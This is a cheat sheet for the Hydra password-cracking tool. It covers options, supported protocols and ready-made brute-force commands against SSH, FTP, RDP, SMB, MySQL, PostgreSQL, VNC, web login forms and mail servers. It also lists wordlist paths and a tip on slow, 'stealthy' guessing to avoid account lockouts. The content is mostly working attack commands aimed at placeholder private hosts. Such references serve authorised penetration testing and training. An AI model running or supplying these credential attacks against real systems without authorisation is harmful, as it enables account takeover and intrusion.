Very fast online password cracking tool

# Hydra Cheat Sheet

---

## Basic Syntax

```
hydra [options] <target> <protocol>
```

---

## Common Options

|Option|Description|
|---|---|
|`-l <user>`|Single username|
|`-L <file>`|Username list file|
|`-p <pass>`|Single password|
|`-P <file>`|Password list file|
|`-t <n>`|Number of parallel tasks/threads (default: 16)|
|`-T <n>`|Total number of concurrent connections|
|`-s <port>`|Custom port|
|`-S`|Use SSL/TLS|
|`-v`|Verbose output|
|`-V`|Show each login attempt|
|`-d`|Debug mode|
|`-o <file>`|Write results to file|
|`-f`|Stop after first valid login found (per host)|
|`-F`|Stop after first valid login found (global)|
|`-u`|Loop around users, not passwords (try user1:pass1, user2:pass1 ...)|
|`-e nsr`|Try `n`=null, `s`=same as login, `r`=reversed login as password|
|`-w <n>`|Wait time (seconds) between retries|
|`-W <n>`|Wait time between connection attempts per thread|
|`-M <file>`|Target list (multiple hosts)|
|`-x min:max:charset`|Password bruteforce generation|
|`-R`|Restore a previous session|
|`-I`|Ignore existing restore file|

---

## Protocols Supported

|Category|Protocols|
|---|---|
|**Remote access**|ssh, telnet, rlogin, rsh|
|**File transfer**|ftp, ftps, sftp|
|**Web**|http-get, http-post-form, https-get, https-post-form, http-head|
|**Email**|smtp, smtps, pop3, pop3s, imap, imaps|
|**Database**|mysql, mssql, postgres, oracle-listener|
|**Windows**|smb, rdp, winrm|
|**Other**|ldap2, ldap3, redis, mongodb, vnc, snmp, xmpp, sip|

---

## Examples by Protocol

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10
hydra -L users.txt -P passwords.txt ftp://192.168.1.10 -t 4 -v
```

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4 -o results.txt
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.10
```

### RDP

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.10
```

### SMB

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.10
```

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.10
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.10
```

### VNC

```bash
hydra -P passwords.txt vnc://192.168.1.10
```

---

## HTTP Form Attacks

### GET-based login

```bash
hydra -l admin -P passwords.txt http-get://192.168.1.10/login
```

### POST-based login (most common)

```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

#### POST form syntax breakdown:

```
"<path>:<post_data>:<failure_string>"
```

|Placeholder|Replaced with|
|---|---|
|`^USER^`|Current username attempt|
|`^PASS^`|Current password attempt|

#### Success string (use `S=` prefix instead of failure):

```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Dashboard"
```

#### With cookies or headers:

```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: session=abc123"
```

---

## SMTP / Email

```bash
# SMTP login
hydra -l user@example.com -P passwords.txt smtp://mail.example.com

# SMTP with STARTTLS on port 587
hydra -l user@example.com -P passwords.txt -s 587 smtp://mail.example.com

# SMTPS (port 465)
hydra -l user@example.com -P passwords.txt smtps://mail.example.com
```

---

## Brute Force (Password Generation)

Generate passwords on-the-fly without a wordlist using `-x`:

```
-x min_len:max_len:charset
```

|Charset symbol|Characters|
|---|---|
|`a`|lowercase a-z|
|`A`|uppercase A-Z|
|`1`|digits 0-9|
|`!`|special characters|

```bash
# 4-6 character lowercase + digits
hydra -l admin -x 4:6:a1 ftp://192.168.1.10

# 6-8 character mixed case + digits
hydra -l admin -x 6:8:aA1 ssh://192.168.1.10
```

---

## Multiple Targets

```bash
# From a target list file (one IP per line)
hydra -L users.txt -P passwords.txt -M targets.txt ftp

# With custom port per target (add :port in file)
# e.g. targets.txt: 192.168.1.10:2121
```

---

## Useful Combos

### Quick check with common passwords

```bash
hydra -l admin -e nsr ftp://192.168.1.10
# Tries: blank password, password=username, password=reversed username
```

### Slow and stealthy (avoid lockout)

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.10 -t 1 -W 5
```

### Resume a stopped session

```bash
hydra -R
```

### Save results

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.10 -o found.txt
```

---

## Wordlists (Kali Linux)

|Path|Description|
|---|---|
|`/usr/share/wordlists/rockyou.txt`|Classic large wordlist|
|`/usr/share/wordlists/fasttrack.txt`|Small, common passwords|
|`/usr/share/seclists/Passwords/`|SecLists password collections|
|`/usr/share/seclists/Usernames/`|SecLists username lists|

---

## Tips

- Use `-t 4` for SSH/RDP — higher thread counts trigger lockouts or bans.
- Always test with `-V` first on a small list to confirm the form syntax is correct.
- Use `-e nsr` before a full wordlist — catches trivial credentials instantly.
- FTPS: add `-S` flag or use `ftps://` scheme.
- For web apps, capture the login request in Burp Suite first to get the exact POST parameters.

---

## Quick Reference

```
Single user, wordlist:   hydra -l admin -P rockyou.txt <proto>://<host>
User list, wordlist:     hydra -L users.txt -P passwords.txt <proto>://<host>
Custom port:             hydra -l admin -P passes.txt -s 2121 ftp://<host>
HTTP POST form:          hydra -l admin -P passes.txt <host> http-post-form "/path:params:fail_str"
Brute force:             hydra -l admin -x 4:6:aA1 <proto>://<host>
Stop on first find:      hydra -l admin -P passes.txt -f <proto>://<host>
Save output:             hydra -l admin -P passes.txt <proto>://<host> -o out.txt
Resume:                  hydra -R
```